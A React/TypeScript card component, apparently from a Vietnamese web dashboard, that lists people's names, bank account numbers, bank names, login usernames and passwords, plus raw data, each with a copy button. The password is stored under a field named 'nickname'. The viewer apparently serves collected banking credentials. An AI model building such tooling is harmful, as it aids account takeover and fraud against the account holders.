"use client";

import { motion } from "framer-motion";
import {
  Copy,
  CreditCard,
  FileText,
  KeyRound,
  Landmark,
  Lock,
  User,
} from "lucide-react";
import React from "react";

export type RecordItem = {
  hoVaTen: string;
  soTaiKhoan: string;
  tenNganHang: string;
  tenDangNhap: string;
  nickname: string;
  rawData: string;
  createdAt: string;
};

export default function RecordCard({
  data,
  accent = "rgb(59,130,246)",
  onCopy,
}: {
  data: RecordItem;
  accent?: string;
  onCopy: (text: string) => void;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 14 }}
      animate={{ opacity: 1, y: 0 }}
      whileHover={{ y: -2 }}
      transition={{ duration: 0.22 }}
      className="glass p-4 sm:p-5 rounded-2xl"
    >
      {/* header */}
      <div className="flex items-start justify-between">
        <div className="flex items-center gap-2 min-w-0">
          <User size={18} className="icon-dim" />
          <h2
            className="text-base font-semibold truncate"
            style={{ color: accent }}
          >
            {data.hoVaTen}
          </h2>
        </div>
        <span className="text-xs text-dim whitespace-nowrap">
          {new Date(data.createdAt).toLocaleDateString()}
        </span>
      </div>

      <div className="mt-3 space-y-2 text-sm">
        <InfoRow
          icon={<CreditCard size={15} />}
          label="Số TK"
          value={data.soTaiKhoan}
          onCopy={onCopy}
        />
        <InfoRow
          icon={<Landmark size={15} />}
          label="Ngân hàng"
          value={data.tenNganHang}
          onCopy={onCopy}
        />
        <InfoRow
          icon={<KeyRound size={15} />}
          label="Đăng nhập"
          value={data.tenDangNhap}
          onCopy={onCopy}
        />
        <InfoRow
          icon={<Lock size={15} />}
          label="Mật khẩu"
          value={data.nickname}
          onCopy={onCopy}
        />
        <InfoRow
          icon={<FileText size={15} />}
          label="RawData"
          value={data.rawData}
          onCopy={onCopy}
          clamp={2}
        />
      </div>
    </motion.div>
  );
}

function InfoRow({
  icon,
  label,
  value,
  onCopy,
  clamp = 1,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  onCopy: (t: string) => void;
  clamp?: number;
}) {
  return (
    <div className="flex items-start gap-2 group">
      <div className="mt-0.5">{icon}</div>
      <div className="flex-1 min-w-0">
        <div className="flex justify-between gap-3">
          <span className="text-dim text-[11px] uppercase tracking-wide">
            {label}
          </span>
          <button
            onClick={() => onCopy(value)}
            className="opacity-0 group-hover:opacity-100 transition text-[11px] text-white/70 hover:text-white inline-flex items-center gap-1"
            title="Copy"
          >
            <Copy size={12} />
            Copy
          </button>
        </div>
        <div
          className={`text-white/90 text-[13px] break-all ${
            clamp > 1 ? `line-clamp-${clamp}` : "truncate"
          }`}
        >
          {value || "—"}
        </div>
      </div>
    </div>
  );
}
